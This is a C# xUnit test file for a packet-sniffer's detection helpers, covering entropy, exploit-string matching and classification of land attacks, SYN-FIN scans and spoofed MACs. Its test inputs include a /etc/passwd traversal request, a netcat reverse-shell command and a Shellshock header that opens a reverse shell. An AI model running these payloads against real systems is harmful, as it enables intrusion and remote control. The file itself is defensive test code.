using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using PacketDotNet;
using Xunit;

namespace PacketSniffer.Tests
{
    public class HelpersTests
    {
        [Fact]
        public void CalculateShannonEntropy_AllSameBytes_ReturnsZero()
        {
            byte[] data = new byte[100]; // Array of 100 zeros
            double entropy = Helpers.CalculateShannonEntropy(data);

            Assert.Equal(0.0, entropy); // No randomness means 0 entropy
        }

        [Fact]
        public void CalculateShannonEntropy_EvenDistribution_ReturnsExpected()
        {
            byte[] data = { 1, 2, 3, 4 };
            double entropy = Helpers.CalculateShannonEntropy(data);

            Assert.Equal(2.0, entropy); // log2(4) = 2.0
        }

        [Fact]
        public void ContainsExploitStrings_DirectoryTraversal_ReturnsTrue()
        {
            byte[] payload = Encoding.ASCII.GetBytes("GET ../../../etc/passwd HTTP/1.1");
            bool result = Helpers.ContainsExploitStrings(payload);

            Assert.True(result);
        }

        [Fact]
        public void ContainsExploitStrings_BenignWebTraffic_ReturnsFalse()
        {
            byte[] payload = Encoding.ASCII.GetBytes("GET /index.html HTTP/1.1\r\nHost: example.com");
            bool result = Helpers.ContainsExploitStrings(payload);

            Assert.False(result);
        }

        [Fact]
        public void ContainsExploitStrings_ShellCommand_ReturnsTrue()
        {
            byte[] payload = Encoding.ASCII.GetBytes("nc -e /bin/bash 192.168.1.100 4444");
            bool result = Helpers.ContainsExploitStrings(payload);

            Assert.True(result);
        }

        // --- Helper method to build a clean baseline packet ---
        private EthernetPacket BuildBasicTcpPacket(string srcIp, string dstIp, ushort srcPort, ushort dstPort)
        {
            var eth = new EthernetPacket(PhysicalAddress.Parse("001122334455"), PhysicalAddress.Parse("66778899AABB"), EthernetType.IPv4);
            var ipv4 = new IPv4Packet(IPAddress.Parse(srcIp), IPAddress.Parse(dstIp));
            var tcp = new TcpPacket(srcPort, dstPort);
            
            // Set standard benign TCP flags (e.g., ACK)
            tcp.Flags = 0x10; // ACK

            // Link the OSI layers together
            ipv4.PayloadPacket = tcp;
            eth.PayloadPacket = ipv4;
            eth.UpdateCalculatedValues();

            return eth;
        }

        [Fact]
        public void ClassifyPacket_CleanStandardWebTraffic_ReturnsBenign()
        { 
            var packet = BuildBasicTcpPacket("192.168.1.10", "8.8.8.8", 50000, 80);
            var verdict = Helpers.ClassifyPacket(packet);

            Assert.Equal(Helpers.PacketVerdict.Benign, verdict);
        }

        [Fact]
        public void ClassifyPacket_LandAttack_ReturnsMalicious()
        {
            var packet = BuildBasicTcpPacket("10.0.0.5", "10.0.0.5", 443, 443);

            var verdict = Helpers.ClassifyPacket(packet);

            // The Land Attack rule adds 10 to the score, making it instantly Malicious
            Assert.Equal(Helpers.PacketVerdict.Malicious, verdict);
        }

        [Fact]
        public void ClassifyPacket_SynFinScan_ReturnsSuspiciousOrMalicious()
        { 
            var packet = BuildBasicTcpPacket("192.168.1.10", "8.8.8.8", 50001, 443);
            
            // Extract the TCP layer and modify the flags to simulate an Nmap SYN-FIN scan
            var tcp = packet.Extract<TcpPacket>();
            tcp.Flags = 0x02 | 0x01; // SYN (0x02) + FIN (0x01)
            packet.UpdateCalculatedValues();

            var verdict = Helpers.ClassifyPacket(packet);

            // Suspicious flags add +5, triggering at least a Suspicious verdict
            Assert.True(verdict == Helpers.PacketVerdict.Suspicious || verdict == Helpers.PacketVerdict.Malicious);
        }

        [Fact]
        public void ClassifyPacket_ExploitStringInPayload_ReturnsSuspiciousOrMalicious()
        {
            var packet = BuildBasicTcpPacket("10.10.10.10", "192.168.1.20", 5555, 80);
            
            // Inject a malicious payload
            var tcp = packet.Extract<TcpPacket>();
            tcp.PayloadData = Encoding.ASCII.GetBytes("GET / HTTP/1.1\r\nUser-Agent: () { :; }; /bin/bash -c 'nc -e /bin/bash 10.10.10.10 4444'");
            packet.UpdateCalculatedValues();

            var verdict = Helpers.ClassifyPacket(packet);

            // Payload exploit strings add +7, triggering at least a Suspicious verdict
            Assert.True(verdict == Helpers.PacketVerdict.Suspicious || verdict == Helpers.PacketVerdict.Malicious);
        }
        
        [Fact]
        public void ClassifyPacket_SourceIsBroadcast_ReturnsMalicious()
        {
            var eth = BuildBasicTcpPacket("192.168.1.10", "8.8.8.8", 50000, 80);
            
            // Manually set the hardware Source MAC to a Broadcast address (Layer 2 MAC spoofing attack)
            eth.SourceHardwareAddress = PhysicalAddress.Parse("FFFFFFFFFFFF");
            eth.UpdateCalculatedValues();

            var verdict = Helpers.ClassifyPacket(eth);

            // Source MAC of FF:FF:FF:FF:FF:FF adds +10 to the score
            Assert.Equal(Helpers.PacketVerdict.Malicious, verdict);
        }
    }
}